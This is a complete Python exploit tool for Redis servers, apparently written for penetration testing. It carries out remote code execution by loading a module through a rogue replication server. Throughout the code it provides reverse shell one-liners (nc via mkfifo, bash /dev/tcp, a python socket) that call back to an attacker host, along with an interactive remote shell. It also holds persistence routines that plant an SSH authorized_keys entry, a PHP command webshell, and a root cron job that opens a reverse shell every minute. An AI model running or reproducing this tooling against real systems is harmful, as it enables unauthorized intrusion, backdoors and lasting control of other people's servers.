#!/usr/bin/env python3
"""
husky-redis-rce.py — Hacking Husky Redis RCE

Redis 4.x/5.x/6.x/7.x RCE via replication MODULE LOAD chain.
Handles cron resets, dropped connections, and
unstable targets that wipe your foothold every few minutes.

Based on Ridter/redis-rce and n0b0dyCN/redis-rogue-server,
rebuilt with reliability features for real engagement conditions.

Key improvements over the originals:
  • One-shot command mode (-x) — run and exit, scriptable
  • SSH key persistence (--ssh-key) — survives Redis resets
  • Webshell write (--webshell) — drop a PHP shell to web root
  • Crontab persistence (--crontab) — survives reboots
  • Auto-retry on disconnect (--retry) — races cron resets
  • Recon mode (--recon) — fingerprint before committing
  • Built-in reverse shell listener (--listen)
  • Multiple reverse shell payloads (--payload)
  • Server-only mode (--server-only) — for SSRF/blind chains
  • Configurable timeouts and dbfilename
  • Clean RESP protocol handling
  • Proper cleanup even on crash

Author: TheHuskyHacker
"""

import argparse
import base64
import os
import select
import signal
import socket
import struct
import subprocess
import sys
import threading
import time


# ─── Colors ─────────────────────────────────────────────────────────────────
RST  = "\033[0m"
BOLD_A = "\033[1m"

def cyan(s):  return f"\033[96m{s}{RST}"
def red(s):   return f"\033[91m{s}{RST}"
def green(s): return f"\033[92m{s}{RST}"
def yellow(s):return f"\033[93m{s}{RST}"
def blue(s):  return f"\033[94m{s}{RST}"
def bold(s):  return f"\033[1m{s}{RST}"
def dim(s):   return f"\033[2m{s}{RST}"

class C:
    RST  = "\033[0m"
    BOLD = "\033[1m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YEL  = "\033[93m"
    BLU  = "\033[94m"
    MAG  = "\033[95m"
    CYN  = "\033[96m"
    DIM  = "\033[2m"

def info(msg):  print(f"{C.BLU}[*]{C.RST} {msg}")
def good(msg):  print(f"{C.GRN}[+]{C.RST} {msg}")
def warn(msg):  print(f"{C.YEL}[!]{C.RST} {msg}")
def fail(msg):  print(f"{C.RED}[-]{C.RST} {msg}")
def dbg(msg):
    if VERBOSE:
        print(f"{C.DIM}[D] {msg}{C.RST}")

VERBOSE = False

BANNER = f"""
{cyan('    __  ____  _______ __ ____  __')}
{cyan('   / / / / / / / ___// //_/')}\\{cyan(' \\ \\/ /')}
{cyan('  / /_/ / / / /\\__ \\/ ,<')}   {cyan(' \\  /')}
{cyan(' / __  / /_/ /___/ / /| |')}  {cyan(' / /')}
{cyan('/_/ /_/\\____//____/_/ |_|')} {cyan('/_/')}
{red('    ____  __________  _________    ____  ____________')}
{red('   / __ \\/ ____/ __ \\/  _/ ___/   / __ \\/ ____/ ____/')}
{red('  / /_/ / __/ / / / // / \\__ \\   / /_/ / /   / __/')}
{red(' / _, _/ /___/ /_/ // / ___/ /  / _, _/ /___/ /___')}
{red('/_/ |_/_____/_____/___//____/  /_/ |_|\\____/_____/')}

    {bold('R E P L I C A T I O N  +  M O D U L E  R C E')}
    {dim('Persistence first. Shell second. Cron can\'t touch this.')}
"""


# ─── RESP Protocol ──────────────────────────────────────────────────────────

def encode_cmd(*args):
    """Encode arguments into RESP array."""
    buf = f"*{len(args)}\r\n".encode()
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        buf += f"${len(a)}\r\n".encode() + a + b"\r\n"
    return buf


def recv_all(sock, timeout=3):
    """Read all available data from socket with a HARD total deadline."""
    deadline = time.time() + timeout
    sock.settimeout(min(timeout, 2))  # short per-recv timeout
    buf = b""
    try:
        while time.time() < deadline:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            sock.settimeout(min(remaining, 2))
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            # Got data — check if it looks like a complete RESP response
            # If we have a full response, don't wait for more
            decoded = buf.decode(errors="replace")
            if decoded.endswith("\r\n") and any(
                decoded.startswith(p) for p in ("+", "-", ":", "$", "*")
            ):
                break
    except socket.timeout:
        pass
    except OSError:
        pass
    return buf.decode(errors="replace")


# ─── Redis Connection ───────────────────────────────────────────────────────

class Redis:
    def __init__(self, host, port, password=None, timeout=8):
        self.host = host
        self.port = port
        self.password = password
        self.timeout = timeout
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        try:
            self.sock.connect((self.host, self.port))
        except Exception as e:
            fail(f"Connection failed: {e}")
            return False
        good(f"Connected to {self.host}:{self.port}")

        if self.password:
            r = self.cmd("AUTH", self.password)
            if "OK" not in r:
                fail(f"AUTH failed: {r.strip()}")
                return False
            good("Authenticated")
        return True

    def cmd(self, *args):
        """Send RESP command and return response."""
        raw = encode_cmd(*args)
        dbg(f"→ {' '.join(str(a) for a in args)}")
        try:
            self.sock.settimeout(self.timeout)
            self.sock.sendall(raw)
            # Use shorter timeout for recv — 3s is plenty for most commands
            # Only MODULE LOAD and SLAVEOF might need longer
            cmd_name = str(args[0]).upper() if args else ""
            recv_timeout = self.timeout if cmd_name in ("MODULE", "SLAVEOF", "SAVE") else 3
            resp = recv_all(self.sock, recv_timeout)
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            fail(f"Connection lost: {e}")
            resp = f"-ERR connection lost: {e}"
        except Exception as e:
            resp = f"-ERR {e}"
        dbg(f"← {resp[:120].strip()}")
        return resp

    def config_get(self, key):
        """Get a config value."""
        resp = self.cmd("CONFIG", "GET", key)
        lines = resp.strip().split("\r\n")
        for i in range(len(lines) - 1, -1, -1):
            if not lines[i].startswith(("*", "$", "+", "-", ":")):
                return lines[i]
        return ""

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


# ─── Rogue Server ────────────────────────────────────────────────────────────

class RogueServer(threading.Thread):
    """Rogue Redis server that delivers a payload via replication."""

    def __init__(self, host, port, payload):
        super().__init__(daemon=True)
        self.host = host
        self.port = port
        self.payload = payload
        self.ready = threading.Event()
        self.delivered = threading.Event()
        self.error = None

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            srv.bind((self.host, self.port))
        except OSError as e:
            self.error = str(e)
            self.ready.set()
            return

        srv.listen(1)
        srv.settimeout(30)
        self.ready.set()

        try:
            cli, addr = srv.accept()
            info(f"Replication from {addr[0]}:{addr[1]}")
        except socket.timeout:
            self.error = "Timeout waiting for replication"
            return
        finally:
            srv.close()

        cli.settimeout(15)
        try:
            while True:
                data = cli.recv(4096)
                if not data:
                    break
                decoded = data.decode(errors="replace")
                dbg(f"Rogue RX: {decoded.strip()[:80]}")

                if "PING" in decoded:
                    cli.sendall(b"+PONG\r\n")
                elif "REPLCONF" in decoded:
                    cli.sendall(b"+OK\r\n")
                elif "PSYNC" in decoded or "SYNC" in decoded:
                    header = f"+FULLRESYNC {'Z' * 40} 1\r\n"
                    header += f"${len(self.payload)}\r\n"
                    cli.sendall(header.encode() + self.payload + b"\r\n")
                    info(f"Payload delivered ({len(self.payload)} bytes)")
                    self.delivered.set()
                    break
                else:
                    cli.sendall(b"+OK\r\n")
        except Exception as e:
            self.error = str(e)
        finally:
            cli.close()


# ─── Core Exploit ────────────────────────────────────────────────────────────

def recon(r):
    """Fingerprint the Redis instance."""
    print()
    info(f"{C.BOLD}═══ Recon ═══{C.RST}")

    resp = r.cmd("INFO", "server")
    for line in resp.split("\r\n"):
        if line.startswith("redis_version:"):
            info(f"Version:    {C.CYN}{line.split(':',1)[1]}{C.RST}")
        elif line.startswith("os:"):
            info(f"OS:         {line.split(':',1)[1]}")
        elif line.startswith("tcp_port:"):
            info(f"Port:       {line.split(':',1)[1]}")
        elif line.startswith("config_file:"):
            info(f"Config:     {line.split(':',1)[1]}")

    info(f"dir:        {r.config_get('dir')}")
    info(f"dbfilename: {r.config_get('dbfilename')}")

    resp = r.cmd("INFO", "replication")
    for line in resp.split("\r\n"):
        if line.startswith("role:"):
            info(f"Role:       {line.split(':',1)[1]}")

    # Test MODULE
    resp = r.cmd("MODULE", "LIST")
    if "unknown command" in resp.lower():
        warn("MODULE command unavailable")
    else:
        info(f"Modules:    {'(none)' if '*0' in resp else resp.strip()[:60]}")

    print()


def exploit_module_load(r, args, payload_data):
    """Full SLAVEOF → PSYNC → MODULE LOAD chain."""

    orig_dir = r.config_get("dir")
    orig_dbfile = r.config_get("dbfilename")
    module_file = args.module_name

    # Start rogue server
    rogue = RogueServer("0.0.0.0", args.lport, payload_data)
    rogue.start()
    rogue.ready.wait(5)
    if rogue.error:
        fail(f"Rogue server: {rogue.error}")
        return False

    info(f"Rogue server on port {args.lport}")

    # Set up replication
    info("Setting up replication...")
    resp = r.cmd("SLAVEOF", args.lhost, str(args.lport))
    if "OK" not in resp:
        fail(f"SLAVEOF failed: {resp.strip()}")
        return False

    r.cmd("CONFIG", "SET", "dbfilename", module_file)

    # Wait for payload delivery
    info("Waiting for sync...")
    if not rogue.delivered.wait(25):
        fail(f"Sync failed: {rogue.error or 'timeout'}")
        cleanup(r, orig_dir, orig_dbfile)
        return False

    time.sleep(1)

    # Stop replication
    r.cmd("SLAVEOF", "NO", "ONE")
    time.sleep(0.5)

    # Load module
    module_path = f"{orig_dir}/{module_file}"
    info(f"Loading module: {module_path}")
    resp = r.cmd("MODULE", "LOAD", module_path)

    if "OK" not in resp:
        if "already" in resp.lower():
            warn("Module already loaded")
        else:
            fail(f"MODULE LOAD failed: {resp.strip()}")
            cleanup(r, orig_dir, orig_dbfile)
            return False

    good(f"{C.BOLD}RCE achieved!{C.RST}")

    # Restore dbfilename
    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
    return True


def cleanup(r, orig_dir=None, orig_dbfile=None, module_path=None, unload=False):
    """Restore Redis state."""
    info("Cleaning up...")
    try:
        r.cmd("SLAVEOF", "NO", "ONE")
        if orig_dbfile:
            r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
        if unload:
            if module_path:
                r.cmd("system.exec", f"rm -f {module_path}")
            r.cmd("MODULE", "UNLOAD", "system")
            good("Module unloaded")
    except:
        pass


# ─── Execution Modes ────────────────────────────────────────────────────────

def exec_cmd(r, cmd):
    """Run a command via system.exec, return output."""
    resp = r.cmd("system.exec", cmd)
    lines = resp.strip().split("\r\n")
    out = []
    i = 0
    while i < len(lines):
        if lines[i].startswith("$"):
            if i + 1 < len(lines):
                out.append(lines[i + 1])
                i += 2
                continue
        elif not lines[i].startswith(("*", "+", "-", ":")):
            out.append(lines[i])
        i += 1
    return "\n".join(out)


def do_exec(r, cmd):
    """One-shot command execution."""
    info(f"Exec: {cmd}")
    output = exec_cmd(r, cmd)
    if output:
        print(f"\n{C.GRN}{output}{C.RST}\n")
    else:
        warn("No output returned")


def do_shell(r, target):
    """Interactive shell."""
    good("Interactive shell — type 'exit' to quit")
    print()
    try:
        while True:
            try:
                cmd = input(f"{C.CYN}husky{C.RST}@{C.RED}{target}{C.RST}> ").strip()
            except EOFError:
                break
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit", "q"):
                break
            output = exec_cmd(r, cmd)
            if output:
                print(output)
    except KeyboardInterrupt:
        print()
    print()


def do_revshell(r, args):
    """Reverse shell via system.rev."""
    if not args.lhost or not args.lport_rev:
        fail("--lhost and --lport-rev required")
        return

    payloads = {
        "module": None,  # uses system.rev directly
        "mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport_rev} >/tmp/f",
        "bash":   f"bash -i >& /dev/tcp/{args.lhost}/{args.lport_rev} 0>&1",
        "python": f"python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"{args.lhost}\",{args.lport_rev}));[os.dup2(s.fileno(),i) for i in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
    }

    if args.listen:
        t = threading.Thread(target=rev_listener, args=(args.lport_rev,), daemon=True)
        t.start()
        time.sleep(1)

    payload_name = args.payload or "module"

    if payload_name == "module":
        info(f"Sending system.rev → {args.lhost}:{args.lport_rev}")
        r.cmd("system.rev", args.lhost, str(args.lport_rev))
    else:
        shell_cmd = payloads.get(payload_name)
        if not shell_cmd:
            fail(f"Unknown payload: {payload_name}")
            return
        info(f"Sending {payload_name} reverse shell")
        r.cmd("system.exec", shell_cmd)

    good("Reverse shell sent!")

    if args.listen:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass


def rev_listener(port):
    """Built-in reverse shell catcher."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(60)
    try:
        cli, addr = srv.accept()
        good(f"Shell from {addr[0]}:{addr[1]}!")
        print(f"{C.DIM}{'─' * 50}{C.RST}")
        cli.settimeout(0.5)
        while True:
            ready, _, _ = select.select([cli, sys.stdin], [], [], 0.5)
            for s in ready:
                if s is cli:
                    data = cli.recv(4096)
                    if not data:
                        info("Connection closed")
                        return
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                elif s is sys.stdin:
                    line = sys.stdin.readline()
                    if not line:
                        return
                    cli.sendall(line.encode())
    except socket.timeout:
        fail("No callback within 60s")
    except KeyboardInterrupt:
        pass
    finally:
        srv.close()


# ─── Persistence Methods (No Module Needed) ─────────────────────────────────

def write_ssh_key(r, args):
    """Write an SSH authorized_keys via Redis CONFIG SET dir + SAVE.
    Survives Redis restarts, cron resets, and reboots.
    No MODULE LOAD needed — works on any Redis with CONFIG access."""

    key_path = args.ssh_key
    if not os.path.exists(key_path):
        fail(f"SSH key not found: {key_path}")
        return False

    with open(key_path, "r") as f:
        pubkey = f.read().strip()

    info(f"{C.BOLD}Writing SSH key for persistence{C.RST}")

    # Save original config
    orig_dir = r.config_get("dir")
    orig_dbfile = r.config_get("dbfilename")

    # Try common SSH dirs
    ssh_dirs = [
        "/var/lib/redis/.ssh",
        "/home/redis/.ssh",
        "/root/.ssh",
    ]
    if args.ssh_dir:
        ssh_dirs.insert(0, args.ssh_dir)

    for ssh_dir in ssh_dirs:
        info(f"Trying: {ssh_dir}")

        # Create .ssh directory via a trick — write a dummy file to force dir creation
        r.cmd("CONFIG", "SET", "dir", ssh_dir)
        check = r.config_get("dir")
        if ssh_dir not in check:
            dbg(f"Can't set dir to {ssh_dir}")
            continue

        r.cmd("CONFIG", "SET", "dbfilename", "authorized_keys")

        # Pad the key with newlines so Redis RDB headers don't corrupt it
        padded_key = f"\n\n{pubkey}\n\n"
        r.cmd("SET", "husky_key", padded_key)
        r.cmd("SAVE")

        good(f"SSH key written to {ssh_dir}/authorized_keys")

        # Figure out the SSH user from the dir path
        if "/root/" in ssh_dir:
            user = "root"
        elif "/home/" in ssh_dir:
            user = ssh_dir.split("/home/")[1].split("/")[0]
        else:
            user = ssh_dir.split("/var/lib/")[1].split("/")[0] if "/var/lib/" in ssh_dir else "redis"

        good(f"Connect: {C.CYN}ssh -i {key_path.replace('.pub', '')} {user}@{args.target}{C.RST}")

        # Restore
        r.cmd("CONFIG", "SET", "dir", orig_dir)
        r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
        r.cmd("DEL", "husky_key")
        return True

    fail("Could not write SSH key to any directory")
    r.cmd("CONFIG", "SET", "dir", orig_dir)
    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
    return False


def write_webshell(r, args):
    """Write a PHP webshell via CONFIG SET dir + SAVE."""

    web_root = args.webshell
    info(f"{C.BOLD}Writing webshell to {web_root}{C.RST}")

    orig_dir = r.config_get("dir")
    orig_dbfile = r.config_get("dbfilename")

    r.cmd("CONFIG", "SET", "dir", web_root)
    r.cmd("CONFIG", "SET", "dbfilename", "husky.php")
    r.cmd("SET", "husky_shell", '<?php system($_GET["cmd"]." 2>&1"); ?>')
    r.cmd("SAVE")

    good(f"Webshell: {C.CYN}http://{args.target}/{'' if web_root.endswith('/') else '/'}husky.php?cmd=id{C.RST}")

    r.cmd("CONFIG", "SET", "dir", orig_dir)
    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
    r.cmd("DEL", "husky_shell")
    return True


def write_crontab(r, args):
    """Write a cron reverse shell via CONFIG SET dir + SAVE."""

    if not args.lhost or not args.lport_rev:
        fail("--lhost and --lport-rev required for crontab persistence")
        return False

    info(f"{C.BOLD}Writing crontab persistence{C.RST}")

    orig_dir = r.config_get("dir")
    orig_dbfile = r.config_get("dbfilename")

    cron_dirs = ["/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.d"]
    cron_payload = f"\n\n* * * * * bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport_rev} 0>&1'\n\n"

    for cron_dir in cron_dirs:
        r.cmd("CONFIG", "SET", "dir", cron_dir)
        check = r.config_get("dir")
        if cron_dir not in check:
            continue

        r.cmd("CONFIG", "SET", "dbfilename", "root")
        r.cmd("SET", "husky_cron", cron_payload)
        r.cmd("SAVE")

        good(f"Cron written to {cron_dir}/root")
        good(f"Shell will call back to {args.lhost}:{args.lport_rev} every minute")

        r.cmd("CONFIG", "SET", "dir", orig_dir)
        r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
        r.cmd("DEL", "husky_cron")
        return True

    fail("Could not write to any cron directory")
    r.cmd("CONFIG", "SET", "dir", orig_dir)
    r.cmd("CONFIG", "SET", "dbfilename", orig_dbfile)
    return False


# ─── Server-Only Mode ────────────────────────────────────────────────────────

def server_only(args, payload_data):
    """Run rogue server only — for SSRF/blind exploitation."""
    info(f"{C.BOLD}Server-only mode{C.RST}")
    info("Trigger these on the target:")
    print(f"""
  {C.CYN}SLAVEOF {args.lhost} {args.lport}{C.RST}
  {C.CYN}CONFIG SET dbfilename exp.so{C.RST}
  {C.DIM}  (wait for sync){C.RST}
  {C.CYN}SLAVEOF NO ONE{C.RST}
  {C.CYN}MODULE LOAD ./exp.so{C.RST}
  {C.CYN}system.exec "id"{C.RST}
""")
    rogue = RogueServer("0.0.0.0", args.lport, payload_data)
    rogue.start()
    rogue.ready.wait(5)
    if rogue.error:
        fail(f"Rogue server: {rogue.error}")
        return
    info("Waiting for target...")
    rogue.delivered.wait(120)
    if rogue.delivered.is_set():
        good("Payload delivered!")
    else:
        fail(rogue.error or "Timeout")


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    global VERBOSE

    parser = argparse.ArgumentParser(
        description="Hacking Husky Redis RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # One-shot command
  %(prog)s -r TARGET -l LHOST -x 'id'

  # Interactive shell
  %(prog)s -r TARGET -l LHOST

  # Reverse shell with built-in listener
  %(prog)s -r TARGET -l LHOST --rev --lport-rev 4444 --listen

  # SSH key persistence (survives cron resets!)
  %(prog)s -r TARGET --ssh-key ~/.ssh/id_rsa.pub

  # Webshell (no module needed)
  %(prog)s -r TARGET --webshell /var/www/html

  # Crontab persistence
  %(prog)s -r TARGET --crontab --lhost LHOST --lport-rev 4444

  # Recon only
  %(prog)s -r TARGET --recon

  # With auth + retry on disconnect
  %(prog)s -r TARGET -l LHOST -a 'password' -x 'id' --retry 3

  # Server-only (for SSRF/blind)
  %(prog)s -l LHOST --server-only
        """,
    )

    # Target
    parser.add_argument("-r", "--target", help="Target Redis host")
    parser.add_argument("-p", "--rport", type=int, default=6379, help="Redis port (default: 6379)")
    parser.add_argument("-a", "--auth", help="Redis password")

    # Rogue server
    parser.add_argument("-l", "--lhost", help="Your IP (reachable from target)")
    parser.add_argument("--lport", type=int, default=21000, help="Rogue server port (default: 21000)")

    # Payload
    parser.add_argument("-f", "--file", default="module.so", help="Module .so file (default: module.so)")
    parser.add_argument("--module-name", default="husky.so", help="Filename on target (default: husky.so)")

    # Execution
    parser.add_argument("-x", "--cmd", help="One-shot command")
    parser.add_argument("--rev", action="store_true", help="Reverse shell mode")
    parser.add_argument("--lport-rev", type=int, help="Reverse shell port")
    parser.add_argument("--listen", action="store_true", help="Built-in listener")
    parser.add_argument("--payload", choices=["module", "mkfifo", "bash", "python"],
                        default="module", help="Reverse shell type (default: module)")

    # Persistence (no module needed)
    parser.add_argument("--ssh-key", help="Write SSH pubkey for persistence (path to .pub)")
    parser.add_argument("--ssh-dir", help="Target .ssh directory override")
    parser.add_argument("--webshell", help="Write PHP webshell to this web root")
    parser.add_argument("--crontab", action="store_true", help="Write cron reverse shell")

    # Modes
    parser.add_argument("--recon", action="store_true", help="Recon only")
    parser.add_argument("--server-only", action="store_true", help="Rogue server only (SSRF/blind)")

    # Options
    parser.add_argument("--retry", type=int, default=1, help="Retry count on failure (default: 1)")
    parser.add_argument("--timeout", type=int, default=8, help="Socket timeout (default: 8)")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()
    VERBOSE = args.verbose
    print(BANNER)

    # ── Server-only ──
    if args.server_only:
        if not args.lhost:
            parser.error("--server-only needs -l/--lhost")
        payload_data = load_payload(args.file)
        if payload_data:
            server_only(args, payload_data)
        return

    # ── Everything else needs a target ──
    if not args.target:
        parser.error("-r/--target is required")

    # ── Persistence modes (no module needed) ──
    if args.ssh_key or args.webshell or args.crontab:
        r = Redis(args.target, args.rport, args.auth, args.timeout)
        if not r.connect():
            sys.exit(1)
        if args.ssh_key:
            write_ssh_key(r, args)
        if args.webshell:
            write_webshell(r, args)
        if args.crontab:
            write_crontab(r, args)
        r.close()
        return

    # ── Recon ──
    if args.recon:
        r = Redis(args.target, args.rport, args.auth, args.timeout)
        if r.connect():
            recon(r)
            r.close()
        return

    # ── Full exploit (needs lhost and module) ──
    if not args.lhost:
        parser.error("MODULE LOAD exploit needs -l/--lhost")

    payload_data = load_payload(args.file)
    if not payload_data:
        sys.exit(1)

    # Retry loop — for boxes with cron resets
    for attempt in range(1, args.retry + 1):
        if args.retry > 1:
            info(f"Attempt {attempt}/{args.retry}")

        r = Redis(args.target, args.rport, args.auth, args.timeout)
        if not r.connect():
            if attempt < args.retry:
                warn("Retrying in 5s...")
                time.sleep(5)
                continue
            sys.exit(1)

        # Quick recon
        recon(r)

        # Exploit
        if not exploit_module_load(r, args, payload_data):
            if attempt < args.retry:
                warn("Exploit failed — retrying in 5s...")
                r.close()
                time.sleep(5)
                continue
            r.close()
            sys.exit(1)

        # Execute
        try:
            orig_dir = r.config_get("dir")
            orig_dbfile = r.config_get("dbfilename")

            if args.cmd:
                do_exec(r, args.cmd)
            elif args.rev:
                do_revshell(r, args)
            else:
                do_shell(r, args.target)

            # Cleanup
            cleanup(r, orig_dir, orig_dbfile,
                    f"{orig_dir}/{args.module_name}", unload=True)
        except KeyboardInterrupt:
            print()
            warn("Interrupted")
        finally:
            r.close()

        good("Done!")
        break


def load_payload(path):
    """Load the module .so file."""
    from pathlib import Path
    p = Path(path)
    if not p.exists():
        # Try alongside this script
        alt = Path(__file__).parent / path
        if alt.exists():
            p = alt
        else:
            fail(f"Module not found: {path}")
            fail("Build it: cd RedisModules-ExecuteCommand && make")
            return None
    data = p.read_bytes()
    info(f"Loaded module: {p} ({len(data)} bytes)")
    return data


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("Aborted")
        sys.exit(130)
